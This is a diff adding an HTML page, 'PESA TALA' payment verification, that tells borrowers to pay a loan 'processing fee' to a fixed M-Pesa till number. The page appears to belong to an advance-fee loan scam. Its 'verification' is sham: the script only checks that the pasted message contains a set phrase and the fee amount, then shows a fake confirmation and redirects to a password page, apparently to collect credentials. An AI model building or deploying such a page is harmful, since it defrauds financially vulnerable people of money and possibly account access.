@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verification - PESA TALA</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gradient-to-tr from-purple-900 via-purple-700 to-gray-200 min-h-screen p-4 flex items-center justify-center text-purple-900">
+
+  <div class="bg-white/90 backdrop-blur-md max-w-sm w-full rounded-2xl shadow-2xl p-6 relative">
+    <div class="text-center mb-4">
+      <h2 class="text-2xl font-bold text-purple-800">Payment Verification</h2>
+      <p class="text-sm text-gray-600">Please complete your processing fee payment to continue.</p>
+    </div>
+
+    <div class="bg-purple-50 border border-purple-200 rounded-xl p-4 text-sm mb-4">
+      <p><strong>Name:</strong> <span id="borrowerName">...</span></p>
+      <p><strong>Loan Amount:</strong> Ksh <span id="loanAmount">...</span></p>
+      <p><strong>Processing Fee:</strong> Ksh <span id="processingFee">...</span></p>
+    </div>
+
+    <div class="bg-purple-100 p-4 rounded-xl mb-4 text-sm text-gray-800">
+      <p class="font-semibold mb-2">How to pay via M-Pesa:</p>
+      <ul class="space-y-1">
+        <li>Go to M-PESA: <strong>M-PESA</strong></li>
+        <li>Lipa na M-PESA: <strong>Buy Goods & Services</strong></li>
+        <li>
+          Enter Till Number: 
+          <strong id="tillNumber">9824375</strong>
+          <button onclick="copyTill()" class="ml-2 text-xs text-purple-600 underline">Copy</button>
+        </li>
+        <li>Enter Amount: <strong id="amountToPay">Ksh ...</strong></li>
+        <li>Enter your M-PESA PIN</li>
+        <li><strong>HAKIKA R PROVISION</strong></li>
+      </ul>
+    </div>
+
+    <button onclick="window.location.href='checklimit.html'"
+            class="w-full mb-4 bg-gray-200 hover:bg-gray-300 text-purple-700 font-medium py-2 rounded-xl">
+      Change Loan Limit
+    </button>
+
+    <label for="mpesaMessage" class="block mb-1 text-sm font-medium text-gray-700">Paste M-PESA Confirmation Message:</label>
+    <textarea id="mpesaMessage" rows="3" placeholder="Paste message here..." class="w-full p-3 border border-purple-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 text-sm mb-4"></textarea>
+
+    <button onclick="verifyPayment()" class="w-full bg-purple-700 hover:bg-purple-800 text-white font-semibold py-3 rounded-xl transition">
+      Verify Payment
+    </button>
+
+    <p id="status" class="text-center mt-4 text-sm text-red-500 hidden">❌ Verification failed. Check message content.</p>
+  </div>
+
+  <!-- ✅ Popup Modal -->
+  <div id="popupOverlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
+    <div class="bg-white text-purple-900 rounded-2xl p-6 w-11/12 max-w-sm text-center shadow-xl">
+      <h2 class="text-xl font-bold mb-2">✅ Payment Verified</h2>
+      <p class="text-sm mb-4">Thank you, <strong id="popupUser">User</strong>.</p>
+      <p class="text-sm">Your payment of <strong id="popupFee">Ksh ...</strong> for loan <strong id="popupLoan">Ksh ...</strong> has been confirmed.</p>
+    </div>
+  </div>
+
+  <script>
+    const name = localStorage.getItem("fullName") || "Borrower";
+    const loanAmount = localStorage.getItem("loanAmount") || "0";
+    const processingFee = localStorage.getItem("processingFee") || "0";
+
+    document.getElementById("borrowerName").textContent = name;
+    document.getElementById("loanAmount").textContent = parseInt(loanAmount).toLocaleString();
+    document.getElementById("processingFee").textContent = parseInt(processingFee).toLocaleString();
+    document.getElementById("amountToPay").textContent = "Ksh " + parseInt(processingFee).toLocaleString();
+
+    function copyTill() {
+      navigator.clipboard.writeText("9824375").then(() => {
+        alert("Till number copied to clipboard!");
+      });
+    }
+
+    function verifyPayment() {
+      const message = document.getElementById("mpesaMessage").value.toUpperCase();
+      const expected = "HAKIKA R PROVISION";
+      const amountMatch = processingFee;
+
+      if (message.includes(expected) && message.includes(amountMatch)) {
+        // Success – show popup
+        document.getElementById("popupUser").textContent = name;
+        document.getElementById("popupFee").textContent = parseInt(processingFee).toLocaleString();
+        document.getElementById("popupLoan").textContent = parseInt(loanAmount).toLocaleString();
+        document.getElementById("popupOverlay").classList.remove("hidden");
+        document.getElementById("status").classList.add("hidden");
+
+        setTimeout(() => {
+          window.location.href = "password.html";
+        }, 3000);
+      } else {
+        document.getElementById("status").classList.remove("hidden");
+      }
+    }
+  </script>
+
+</body>
+</html>
